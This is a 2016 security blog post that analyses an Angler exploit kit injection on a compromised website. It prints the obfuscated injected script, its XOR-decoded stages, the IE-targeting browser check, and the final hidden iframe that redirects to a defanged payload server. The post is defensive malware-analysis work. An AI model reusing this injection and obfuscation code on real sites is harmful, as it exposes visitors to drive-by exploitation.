<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="Adrian">
<meta name="description"
    content="A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/
The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the click() method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&amp;rsquo;s usually obfuscated." />
<meta name="keywords" content="security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis,blog" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/walking-through-angler-exploit-kit-payload-delivery-analysis/" />


<title>
    
    Walking Through Angler Exploit Kit - Payload Delivery Analysis :: { bit.therapy } 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="Walking Through Angler Exploit Kit - Payload Delivery Analysis">
<meta itemprop="description" content="A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/
The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the click() method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&rsquo;s usually obfuscated.">


<meta itemprop="datePublished" content="2016-04-18T14:28:00&#43;00:00" />
<meta itemprop="dateModified" content="2016-04-18T14:28:00&#43;00:00" />
<meta itemprop="wordCount" content="1564">



<meta itemprop="keywords" content="Malware Analysis,Angler Ek,JSDetox,Remnux,JavaScript,Malware,Revelo," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="Walking Through Angler Exploit Kit - Payload Delivery Analysis"/>
<meta name="twitter:description" content="A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/
The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the click() method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&rsquo;s usually obfuscated."/>



<meta property="article:section" content="Malware Analysis" />
<meta property="article:section" content="Angler Ek" />
<meta property="article:section" content="JSDetox" />
<meta property="article:section" content="Remnux" />
<meta property="article:section" content="JavaScript" />
<meta property="article:section" content="Malware" />
<meta property="article:section" content="Revelo" />

<meta property="article:published_time" content="2016-04-18 14:28:00 &#43;0000 UTC" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">{ bit.therapy }</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/post">Blog</a></li><li><a href="/research">Research</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/post/walking-through-angler-exploit-kit-payload-delivery-analysis/">Walking Through Angler Exploit Kit - Payload Delivery Analysis</a></h2>

            

            <div class="post-content">
                

<p>A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/</p>

<p>The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the <code>click()</code> method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&rsquo;s usually obfuscated.</p>

<h2 id="show-yourself">Show Yourself!</h2>

<p>I&rsquo;ve tried navigating to the website using the latest Chrome and I did not see anything out of the ordinary.</p>

<p>IE11 was a different story: a friendly message pops up saying it has disabled Silverlight because it is outdated (oh thanks!).</p>

<p>The source code was also a pretty good indicator something was wrong. The entire <code>body</code> content was replaced by a <code>div</code> and a <code>script</code> element containing some obfuscated JavaScript. The original body HTML code was moved to a <code>noscript</code> element while the <code>head</code> content was left unchanged:</p>

<pre><code class="language-html">&lt;html dir=&quot;ltr&quot; lang=&quot;en-US&quot;&gt;&lt;head&gt;
&lt;!-- [ ... original HTML code ... ] --&gt;
&lt;/head&gt;
&lt;body class=&quot;template-single&quot;&gt;
&lt;div id=&quot;btmnyg&quot; style=&quot;display:none&quot;&gt;37 cf,at58bn .a55rb- 1p12 blc101 i1c02i 2cud2l d58 ja3i6 35 41 34b q58 9af9 6-2 3e-6 41 ne40 47 44n 63 1b6-sbw b100tejag 10a2- baac,s10al1 at102b -2h2 5d8g 3d6 -35 4x1 34e-f ,5d8 99 46 y3c7 6k3a n34 3-aq2, b4ja0 p1b6 10i0a -118 41 xe47va 6y3e 58f e1h-12 e22 -11a1 63-e-h-d-k -d59 1a1cndi9 d12xc4m 12d4 111 97t -bb-ese111g e0 r3-0e 4 8b d11k1 97dgd 16 118-q 4dp3 3.4 6e3 10h1a 5wc2 g3d-4 3e4 46ceb- 5pb9 6t3cdbc. 32c 5wau8 -a1jb1-2g -37a zci58 5d5 g1e18 52fe-r 34 -ea34-et c46ebs- bn59 -63c f3-2bc 58 11c3d a4g1 d-4u7ae -a6l3-a 58 g99 3-3 4a0 gc3e5 b42 57- 37s b-1ndn18et c5md2s- a-34k e34f- ca46 5bp9 b63 32 t58 1a0a-dld2k dp1e0h2ax 10b-0t c5-4 36 4nb3kc 101cb 35 4t4b 5q9 -3d6 h4c2 4s4 -do57ac bu3ag4 63b w-b99 f56 62 ,c4f0 b63rb d12 4a2 4n0 35 b57r 99 c-d3-6 ad35 a41u 40 b53 -2 43 1m01 4-b1 c47b 63 yaz58 dwex22ea '52 c34j '3-a4 46h 59aha 63 c32 5al8 16 bqbc100 b11-hb5- 3f7 5-8 55 100 5b4 40 u35 -44 br4bn4 40by aba11b2dj d41 n47e 63-h 5d8 9c9ak? 3d3t 40- 35a fa4ua2 5x7 a37k-bt c96 -d52 34 34 46 b5k9 63 bv-3a2 -5a8c 118 47i 63 a40kd- 44 38ta 118-f au4e8 -n48 36 43 10e1cdqde- 3cy5 c4s-4 59cl a36 4t2b -4hdl-4 e57 3i4 ede6l-e3r 99-a 5nb6 c6a2 4h0 apcja63 xb1m2 4am2 4e0 3h5e h57 99 36 3-5 41 40 b53 s2 43 -101ce bc-ab111 d0 3,0 4l 8 a1s-09b 1-24 gb1-25 1n-11 10a;0 115be kb3eb7 wc58g 5-5b 100 5w4 40a g3addr5db 44 44 ema-40w 1,cg02 d102'e ce'1.18b 4p8 4-btc4 d3b6- 44cc- 11wa2 aa1u11 bma2 63 g24 1bwa24z 0ece 9 q5 2c0 h3-b7 41 5t8 43a 111 ra118i asdk36 61 -5d5 ,1t12 41 34aq 4-c6 l56 -3d2k 4c0 35 5-7 99g b42-s 40 57 c8- jbz33 b40aa 32-w 4b0 3da5b 57 1bi5 52 aw4c -41c- 1ct01 111 4-cc7 c57 a3b2n 3-5 bqa5ba2qb -e42 111 1aj00 -b99 36 3h5 35c 40 ,63 5 u25 0!c 1 1a1d8-f 37 c60 56k 46 1b-12 r35 32 b3-7 4kb6s b3ca5 bcy112 -a3,7sb 58 5g5 a118c 5e9 52 hb34 -39ce 35 112 111 111 '118 s'36 -6el1 55 112 e36 61 -jb55 99 6p3 4a0 qd6-1 3r-3 a44 a46 4a0 p101 98b 22 19r a44 96gc j55ale- we,16m e98 42 97q 1-bp11 a1qd1r1 1b-0f0ad -1b18 ,43 34 6mav3 10cj-1 c5r2 34 3e4 p46 59 6e3 32p 5-e8 112 3-7 qe58b, ayb55 cc1yb-be.18 l52d pb-m3crc4 a34b obt46d 5-z9 -d63 32 58- 1g1,3a- 36 a-b6ea1qe 55 h9a-r9 -cf33- 40 3d5c 42c 57k c3d7 1en18 52 3e4 t34 a46 5ka9 o-b-63e 3a2 58- 102 10r2 1-0bna0 hc54lcpcl 55 b52 u4,b4 v-c-a-59 5am5 47 a112 36hab 6c1 qe55j- 99 4da6 c37 4id4jcl b63 14l 3bl4 4c1 40 -i1cu2a 57 1-x0a1f 52 34 a34 46 59- 6fe3 k3dc2cj c58rc f100 1-18ca e36 43 1k0eo1 37 cta-u60 a56 46 w104 -40 35 a4i4b 44pbe 4b0gd 1kc0fe0c 54- 59 5c2 34lb 39 3-w5 10a2 ea1i12bea 3h0b 57- 6i3bfbg 36- 3cp5 42cjb 99 4s3 6b-3 34 xcaa-32 ba14kb 37 e4av4 6-3chaaci.d -g14 34 cke-41c 40 1b0n1b 10r1apc 10x1c 39 5m2 4dh0 102 -e5-5 pc5-2 4qdu4ahe 59 v55 -47em 96d, 116xb 1-22 1r00a 1n9 4a4aas 36 44a -99 4q6bq 3b7- 44 e6cg3 14 -3c4 4nb1 40 k12 b57qbv 10-e1 -ma35pa lb3-2b -37a a4b6 3q5a abm10b4cb 4-4 pb3t6 c44 h99 3-3 40 35 42 c57ea -y37 -1au00 100a 10-f4 12a7 12jc0 -1f2'0 bb'100 1-c-18 35hdid 3sb2 r37 c46 3-g5; 102c -10d2,ab 118aqb f4a8jb jbd4by0 c3-3u 62 ds4bob0hc 5-j4 3b9 5bc2 40 112v 101 b55-e 52aicha 44xbnd 5nb9o -55 bn47 9c6 116 i12bw2ah 1-0a-k-0 103 aw1,ak2-d4- t126 1-ba-b03hdob-hd ye4-0 a3b5 -44 4u4a 4b0 118 4a8a a37 60da o56e 4k,6 d102 c10d2 118- 48z 2ae2 1.e6vd 22 111y e46 3a4b x35a n6a2 n57aqa-o-c- h63 56 4db6 57 34e- 63 1p11 a1-6 22deq -e1me1c-1dz 4dg6cx 34be a3a5 6.cj2a 57t 63 c5-edg6e l46 5e7 3qd4zcja b6-3a. 1s1cv1c 1nd6yc v101 59 52 34 39 35 100 101 100 118&lt;/div&gt;
&lt;script&gt;
fuh=&quot;\x63&quot;;fjhcdhh=&quot;\x63\x6f&quot;;wmf=fjhcdhh;eaq=&quot;\x6c\x65&quot;;jqfni=&quot;\x3b&quot;;ndtoku=&quot;\x73&quot;;trn=&quot;\x5d&quot;;cykh=&quot;\x6e&quot;;ls=&quot;\x6e&quot;;qxlifk=&quot;\x43&quot;;wmf+=ls;ls+=fjhcdhh;euydr=&quot;\x22\x29\x2e&quot;;ogi=&quot;\x74&quot;;fripj=&quot;\x62\x74&quot;;eqpg=&quot;\x6f\x63&quot;;wmf+=ndtoku;dnqy=&quot;\x2c\x61&quot;;ndtoku=fjhcdhh;jiifc=&quot;\x69&quot;;stp=&quot;\x74&quot;;nzkoq=&quot;\x74\x28&quot;;wmf+=stp;jkvl=&quot;\x74\x2e&quot;;wzh=&quot;\x65\x76&quot;;maamkz=&quot;\x5b&quot;;taaqlq=&quot;\x22&quot;;rbiztizj=&quot;\x29&quot;;stp+=fjhcdhh;kdqfblc=&quot;\x6f&quot;;smc=&quot;\x28&quot;;laqfq=&quot;\x54\x4d\x4c&quot;;dsek=&quot;\x65&quot;;ghfds=&quot;\x72&quot;;moq=&quot;\x70\x6c&quot;;gunv=&quot;\x72&quot;;qvh=&quot;\x6c\x6c&quot;;smgwhh=&quot;\x6e&quot;;wmf+=gunv;aqpg=&quot;\x22&quot;;qptzn=&quot;\x64&quot;;gunv+=fjhcdhh;cguffh=&quot;\x75&quot;;wmf+=cguffh;wmf+=fuh;wmf+=ogi;iprya=&quot;\x30&quot;;zunwxohu=&quot;\x70&quot;;pgtdejl=&quot;\x72&quot;;ogi+=stp;wmf+=kdqfblc;bjgql=&quot;\x64&quot;;kdqfblc+=ndtoku;kpdouw=&quot;\x2b&quot;;wmf+=ghfds;zdlqp=&quot;\x69&quot;;iktc=&quot;\x29&quot;;cih=&quot;\x61&quot;;xhsbxye=&quot;\x69&quot;;zfda=&quot;\x73\x70&quot;;wsmdro=&quot;\x22&quot;;ghfds+=cguffh;nnl=&quot;\x37&quot;;hsn=&quot;\x69&quot;;quu=&quot;\x2b&quot;;bpkkmf=&quot;\x22\x29&quot;;sbq=&quot;\x73\x65&quot;;zlz=&quot;\x3c\x61&quot;;izlfn=&quot;\x43&quot;;tpzdpm=&quot;\x28&quot;;oqlz=&quot;\x74&quot;;btlj=&quot;\x65\x6e&quot;;qdej=&quot;\x61&quot;;mnzeh=&quot;\x74\x28\x61&quot;;mbrcri=&quot;\x70\x6c&quot;;hnum=&quot;\x6e\x67\x2e&quot;;xtimwp=&quot;\x61\x63\x65&quot;;aiyzfl=&quot;\x6e&quot;;fghbbv=&quot;\x2e&quot;;dhjqrsh=&quot;\x2e&quot;;kgsclm=&quot;\x65\x74&quot;;aotmwk=&quot;\x6e&quot;;cpdid=&quot;\x61\x3d\x64&quot;;cdkmp=cpdid;wtrt=&quot;\x2e&quot;;cdkmp+=eqpg;eqpg=&quot;\x6a\x67&quot;;nhfpy=&quot;\x37&quot;;wbr=&quot;\x6f\x6d&quot;;bdmxyb=&quot;\x72\x48&quot;;tpzdpm+=&quot;\x53&quot;;zreycyh=&quot;\x29&quot;;ddrab=&quot;\x61&quot;;ydhdtj=&quot;\x75&quot;;urtphl=&quot;\x5e&quot;;oib=&quot;\x28\x2f&quot;;axl=&quot;\x6e&quot;;qbnmga=&quot;\x20&quot;;wbyb=&quot;\x65&quot;;dyy=&quot;\x6d\x6e&quot;;qkrbj=&quot;\x6c&quot;;mxbbc=&quot;\x6f&quot;;ha=&quot;\x79&quot;;hyrgy=&quot;\x69&quot;;aujd=&quot;\x67\x74\x68&quot;;uxtrv=&quot;\x42&quot;;dyy+=&quot;\x79\x67\x22&quot;;qmuhr=&quot;\x45&quot;;bwvues=&quot;\x6c\x69&quot;;tacu=&quot;\x67&quot;;mse=&quot;\x64&quot;;ink=&quot;\x29&quot;;xmy=&quot;\x79&quot;;mdxw=&quot;\x3b&quot;;mnzeh+=&quot;\x5b&quot;;go=&quot;\x75\x6d&quot;;cdkmp+=go;wbet=&quot;\x3d&quot;;cdkmp+=btlj;btlj=go;efpza=&quot;\x68&quot;;cdkmp+=jkvl;jkvl=&quot;\x70\x67\x6f&quot;;cdkmp+=tacu;tacu=&quot;\x64\x64\x66&quot;;sfaeda=&quot;\x65&quot;;cdkmp+=kgsclm;kgsclm+=eqpg;cdkmp+=qmuhr;td=&quot;\x61&quot;;tpzdpm+=&quot;\x74&quot;;kepdewb=&quot;\x2e&quot;;ddt=&quot;\x5b\x5e\x5c&quot;;dezgl=&quot;\x3b&quot;;scu=&quot;\x66\x72&quot;;jwcbqpr=&quot;\x69&quot;;otrms=&quot;\x49&quot;;hmpuneymb=&quot;\x29&quot;;picgwdni=&quot;\x5d&quot;;tpzdpm+=&quot;\x72&quot;;picgwdni+=&quot;\x3d\x70&quot;;wzpfhb=&quot;\x3b\x66&quot;;tpzdpm+=&quot;\x69&quot;;rdhd=&quot;\x49&quot;;zfvvbdm=&quot;\x6c\x65\x6d&quot;;cdkmp+=zfvvbdm;upmkj=&quot;\x6f\x72\x28&quot;;cdkmp+=dsek;dsek=&quot;\x64\x62\x67&quot;;cdkmp+=smgwhh;cdkmp+=oqlz;oqlz=btlj;cdkmp+=uxtrv;uxtrv=&quot;\x6c\x64&quot;;cdkmp+=xmy;xmy=&quot;\x7a\x64\x6d&quot;;cdkmp+=rdhd;rdhd=&quot;\x79\x6c\x65&quot;;ewxaav=&quot;\x72\x65&quot;;cdkmp+=mse;nizgq=&quot;\x28&quot;;cdkmp+=nizgq;qptzn+=&quot;\x20&quot;;cdkmp+=wsmdro;wsmdro+=uxtrv;aujd+=&quot;\x3b&quot;;cdkmp+=fripj;fripj+=wsmdro;cdkmp+=dyy;dyy=&quot;\x6e\x6c\x7a&quot;;aum=&quot;\x6e&quot;;cdkmp+=iktc;iktc+=tacu;cdkmp+=dhjqrsh;dhjqrsh+=dyy;qptzn+=&quot;\x5d&quot;;cdkmp+=hsn;hsn=fripj;cdkmp+=aum;aum=&quot;\x6d\x72\x71&quot;;picgwdni+=&quot;\x61\x72&quot;;cdkmp+=aiyzfl;aiyzfl=dsek;cdkmp+=sfaeda;sfaeda=&quot;\x70\x6c&quot;;qptzn+=&quot;\x2f&quot;;cdkmp+=bdmxyb;atok=[][wmf];bdmxyb=jkvl;qptzn+=&quot;\x67&quot;;cdkmp+=laqfq;laqfq=qmuhr;cdkmp+=kepdewb;kepdewb+=laqfq;cdkmp+=ewxaav;qptzn+=&quot;\x2c&quot;;cdkmp+=moq;moq=go;cdkmp+=xtimwp;xtimwp+=dhjqrsh;cdkmp+=oib;oib+=aum;cdkmp+=ddt;ddt=&quot;\x66\x71\x73&quot;;cdkmp+=qptzn;cdkmp+=aqpg;aqpg=xmy;cdkmp+=euydr;cdkmp+=zfda;zfda+=wsmdro;cdkmp+=bwvues;bwvues+=kgsclm;cdkmp+=nzkoq;nzkoq=&quot;\x6c\x63&quot;;cdkmp+=taaqlq;taaqlq=ddt;cdkmp+=qbnmga;qbnmga+=kgsclm;cdkmp+=bpkkmf;bpkkmf=moq;cdkmp+=wzpfhb;wzpfhb=sfaeda;cdkmp+=upmkj;upmkj+=fripj;cdkmp+=xhsbxye;cdkmp+=wbet;wbet+=xmy;cdkmp+=iprya;cdkmp+=dezgl;dezgl=&quot;\x68\x6c&quot;;cdkmp+=jiifc;cdkmp+=zlz;zlz+=qptzn;cdkmp+=fghbbv;fghbbv=&quot;\x64\x6c\x76&quot;;cdkmp+=eaq;eaq=&quot;\x71\x64&quot;;cdkmp+=axl;axl+=laqfq;cdkmp+=aujd;cdkmp+=zdlqp;zdlqp=&quot;\x79\x77&quot;;cdkmp+=kpdouw;cdkmp+=quu;cdkmp+=ink;cdkmp+=qdej;qdej+=btlj;cdkmp+=maamkz;maamkz+=hsn;cdkmp+=hyrgy;hyrgy=&quot;\x72\x65\x6e&quot;;cdkmp+=picgwdni;picgwdni=&quot;\x62\x77\x76&quot;;cdkmp+=sbq;sbq=qmuhr;cdkmp+=otrms;otrms=bdmxyb;cdkmp+=cykh;cykh=dsek;cdkmp+=mnzeh;mnzeh=&quot;\x7a\x6d\x68&quot;;cdkmp+=jwcbqpr;jwcbqpr=&quot;\x70\x63\x6c&quot;;cdkmp+=trn;trn=&quot;\x6c\x79&quot;;cdkmp+=hmpuneymb;hmpuneymb=qmuhr;cdkmp+=urtphl;urtphl=dhjqrsh;cdkmp+=nnl;nnl=ewxaav;cdkmp+=nhfpy;nhfpy=kgsclm;cdkmp+=mdxw;cdkmp+=wzh;wzh=&quot;\x61\x72&quot;;cdkmp+=td;td=&quot;\x7a\x77\x6e&quot;;cdkmp+=qkrbj;qkrbj=moq;cdkmp+=tpzdpm;tpzdpm=&quot;\x70\x62&quot;;cdkmp+=hnum;hnum=&quot;\x65\x69\x6b&quot;;cdkmp+=scu;cdkmp+=wbr;wbr=&quot;\x64\x6e\x62&quot;;cdkmp+=izlfn;cdkmp+=efpza;efpza+=kgsclm;cdkmp+=ddrab;cdkmp+=pgtdejl;pgtdejl=go;cdkmp+=qxlifk;cdkmp+=mxbbc;mxbbc=&quot;\x69\x73\x77&quot;;cdkmp+=bjgql;bjgql+=dhjqrsh;cdkmp+=wbyb;xvtk=atok[wmf];kevvn=&quot;\x6e&quot;;kevvn+=&quot;\x75&quot;;kevvn+=&quot;\x64&quot;;kevvn+=&quot;\x6b&quot;;kevvn+=&quot;\x61&quot;;wmf=kevvn;wbyb=smgwhh;cdkmp+=wtrt;cdkmp+=cih;cdkmp+=zunwxohu;zunwxohu=iktc;cdkmp+=mbrcri;mbrcri+=zfvvbdm;cdkmp+=ha;ha=aum;cdkmp+=smc;smc+=mse;cdkmp+=aotmwk;cdkmp+=ydhdtj;cdkmp+=qvh;qvh+=sfaeda;cdkmp+=dnqy;dnqy=iktc;cdkmp+=rbiztizj;cdkmp+=zreycyh;zreycyh+=dyy;cdkmp+=jqfni;xvtk(cdkmp)();vwgmvmh=&quot;\x6f\x6e&quot;;vwgmvmh+=&quot;\x62\x66\x68&quot;;cdkmp=vwgmvmh;
&lt;/script&gt;
&lt;noscript&gt;
&lt;!-- [ ... original website body HTML code ... ] --&gt;
&lt;/noscript&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

<p>Refreshing the page with different user agents would return new data for the div and scripting elements. Angler and other EKs do this to increase the rate of success for exploitation. There&rsquo;s no point in targeting Chrome if you have no way to escape its sandbox.</p>

<p>Alright, it&rsquo;s time to figure out how the obfuscated JavaScript interacts with the div to create the typical redirect Angler uses to deliver the payload.</p>

<h2 id="the-first-stage">The First Stage</h2>

<p>The obfuscated code is fairly simple, and we just need to add a breakpoint before any function call and review the scope variable values. In this particular piece of code, <code>xvtk()</code> is a good start:</p>

<p><img src="/images/2016/04/code-walkthrough.PNG" alt="" /></p>

<p>When the breakpoint hits, the variable <code>cdkmp</code> contains the first piece of code Angler will execute with <code>xvtk()</code>&rsquo;s help (cleaned up):</p>

<pre><code class="language-javascript">/** @type {Array.&lt;string&gt;} */
a = document.getElementById(&quot;btmnyg&quot;).innerHTML.replace(/[^\d ]/g, &quot;&quot;).split(&quot; &quot;);
/** @type {number} */
i = 0;
for (;i &lt; a.length;i++) {
  /** @type {number} */
  a[i] = parseInt(a[i]) ^ 77;
}
eval(String.fromCharCode.apply(null, a));
</code></pre>

<p>Again, simple enough: remove any non-int and non-space characters from the <code>btmnyg</code> div, split by space and iterate through the resulting array performing a bitwise XOR operation using <code>77</code> (^).</p>

<p>The resulting byte array is just more JavaScript (notice the <code>eval()</code> at the end). If we replace <code>eval</code> with <code>console.log</code>, we see this (cleaned up):</p>

<pre><code class="language-javascript">hwz = (+[window.sidebar]) + (+[window.chrome]);
dbrw = [&quot;rv:11&quot;, &quot;MSIE&quot;];
for (yoocvrmw = hwz; yoocvrmw &lt; dbrw.length; yoocvrmw++) {
    if (navigator.userAgent.indexOf(dbrw[yoocvrmw]) &gt; hwz) {
        enaae = dbrw.length - yoocvrmw;
        break;
    }
}
if (navigator.userAgent.indexOf(&quot;MSIE 10&quot;) &gt; hwz) {
    enaae++;
}
aia = &quot;OrU1MDHYhdwf&quot;;
ipz = document.getElementById(&quot;btmnyg&quot;).innerHTML;
hquc = nmhcn = hwz;
vyojn = &quot;&quot;;
ipz = ipz.replace(/[^a-z]/g, &quot;&quot;);
for (yoocvrmw = hwz; yoocvrmw &lt; ipz.length; yoocvrmw++) {
    zyavzb = ipz.charCodeAt(yoocvrmw);
    if (hquc % enaae) {
        vyojn += String.fromCharCode(((jye + zyavzb - 97) ^ aia.charCodeAt(nmhcn % aia.length)) % 255);
        nmhcn++;
    } else {
        jye = (zyavzb - 97) * 13 * enaae;
    }
    hquc++;
}[][&quot;constructor&quot;][&quot;constructor&quot;](vyojn)();
</code></pre>

<h2 id="more-obfuscation">More Obfuscation</h2>

<p>The above JavaScript looks a bit complicated, but we just want to focus on <code>vyojn</code> as it is the only string variable populated by a <code>for</code> loop.</p>

<p>Essentially, the code pulls all <code>a-z</code> characters from the <code>btmng</code> div and using some math magic it decodes the eventual redirect code.</p>

<p>The first line is interesting because this is where it eliminates out-of-scope browsers. In order for the decode operation to go through (the <code>for</code> loops) <code>hwz</code> must be equal to <code>0</code></p>

<pre><code class="language-javascript">hwz = (+[window.sidebar]) + (+[window.chrome]);
</code></pre>

<p>The line above returns <code>NaN</code> (not a number) on Chrome/FireFox/Edge. Since JavaScript can&rsquo;t perform numerical operations on <code>NaN</code>, the <code>for</code> loops and consequently the payload delivery are skipped.</p>

<p>On IE 11 and earlier it returns <code>0</code></p>

<p>The next few lines are an elaborate way of checking for IE11 and most of IE10&rsquo;s user agents.</p>

<p>If we look further down into the code we notice the value of <code>enaae</code> must be at least <code>2</code> in order for anything to decode at all:</p>

<pre><code class="language-javascript">    if (hquc % enaae) {
        vyojn += [decoding operation]
    } else {
        jye = (zyavzb - 97) * 13 * enaae;
    }
</code></pre>

<p>The first <code>for</code> loop and the proceeding <code>if</code> statement tell us that <code>enaae</code> will be set to <em>2</em> if:</p>

<ul>
<li>The user agent string contains <code>rv:11</code> (IE11)</li>
<li>&hellip; or the user agent string contains <code>MSIE 10</code> (most IE10&rsquo;s)</li>
</ul>

<p>Once we have the proper user agent set, a breakpoint on the last line will allow us to see the decoded payload <code>vyojn</code>:</p>

<p><img src="/images/2016/04/code-walkthrough2.png" alt="" /></p>

<p>The resulting redirect code (cleaned up):</p>

<pre><code class="language-javascript">var date = new Date(new Date().getTime() + 60*60*24*7*1000); 

document.cookie = &quot;PHP_SESSION_PHP=425; path=/; expires=&quot;+date.toUTCString(); 
document.cookie = &quot;_PHP_SESSION_PHP=366; path=/; expires=&quot;+date.toUTCString();

document.write('
&lt;style&gt;
	.bjiwhujrrjgmdcv {
		position: absolute;
		top: -779px;
		width: 300px;
		height: 300px;
	}
&lt;/style&gt;
&lt;div class=&quot;bjiwhujrrjgmdcv&quot;&gt;
	&lt;iframe src=&quot;hxxp://panfluit.williammurphyministries.org/73867600-redeveloping-golfers-disapproving-ornithology-lids-interjectional.html&quot; width=&quot;250&quot; height=&quot;250&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
');
</code></pre>

<p>And there it is, a hidden <code>iframe</code> pointing to the payload delivery server: <code>panfluit.williammurphyministries.org</code>.</p>

<h2 id="a-better-way">A Better Way</h2>

<p>Keep in mind that accessing the page with different user agents would change the value for the first stage, the data div <code>btmnyg</code> and ultimately the redirect code.</p>

<p>If we want to iterate through all the values we&rsquo;ve captured, there is an easier way.</p>

<p>Using <a href="http://www.kahusecurity.com/tools/" target="_blank">Revelo</a> from Kahu Security we can quickly execute the code and see the redirect instantly:</p>

<p><img src="/images/2016/04/code-walkthrough---revelo.png" alt="" /></p>

<p>JSDetox on Remnux is also great for safely analyzing JavaScript. I like the docker version myself: <a href="https://hub.docker.com/r/remnux/jsdetox/" target="_blank">https://hub.docker.com/r/remnux/jsdetox/</a></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
  				<p>
  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/malware-analysis">Malware Analysis</a></span><span class="tag"><a href="/tags/angler-ek">Angler Ek</a></span><span class="tag"><a href="/tags/jsdetox">JSDetox</a></span><span class="tag"><a href="/tags/remnux">Remnux</a></span><span class="tag"><a href="/tags/javascript">JavaScript</a></span><span class="tag"><a href="/tags/malware">Malware</a></span><span class="tag"><a href="/tags/revelo">Revelo</a></span>
  				</p>
  			</div>

        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2019</span>
            
                <span><a href="/">Adrian</a></span>
            
            <span>{ bit.therapy }</span>
            <span> <a href="/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            ...
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>



    </body>
</html>
